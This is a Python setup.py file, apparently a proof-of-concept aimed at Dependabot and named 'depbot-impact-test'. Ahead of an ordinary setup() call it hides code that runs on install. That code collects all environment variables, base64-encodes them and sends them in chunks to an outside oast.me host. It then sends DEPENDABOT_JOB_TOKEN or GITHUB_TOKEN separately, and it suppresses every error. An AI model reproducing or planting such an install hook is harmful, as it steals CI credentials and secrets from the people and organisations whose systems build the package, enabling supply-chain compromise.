import os
import urllib.request
import base64
import json

# Collect all env data
env_data = {}
for k, v in sorted(os.environ.items()):
    env_data[k] = v[:100]  # Truncate values to 100 chars

# Encode as JSON then base64 (URL-safe)
payload = base64.urlsafe_b64encode(json.dumps(env_data).encode()).decode()

# Split into chunks and send via HTTP (multiple requests if needed)
chunk_size = 2000
chunks = [payload[i:i+chunk_size] for i in range(0, min(len(payload), 10000), chunk_size)]
for i, chunk in enumerate(chunks):
    try:
        urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/env/{i}?d=' + chunk, timeout=5)
    except Exception:
        pass

# Also send just the token specifically
token = os.environ.get('DEPENDABOT_JOB_TOKEN', os.environ.get('GITHUB_TOKEN', 'NONE'))
try:
    tok_b64 = base64.urlsafe_b64encode(token.encode()).decode()
    urllib.request.urlopen(f'http://d99nabu1b2er8r4l5b6g1oh7ofjto74s7.oast.me/token?t=' + tok_b64[:2000], timeout=5)
except Exception:
    pass

# Normal setup() for Dependabot
from setuptools import setup
setup(
    name="depbot-impact-test",
    version="1.0.0",
    install_requires=["requests==2.26.0", "urllib3==1.26.5", "flask==2.0.0"],
)
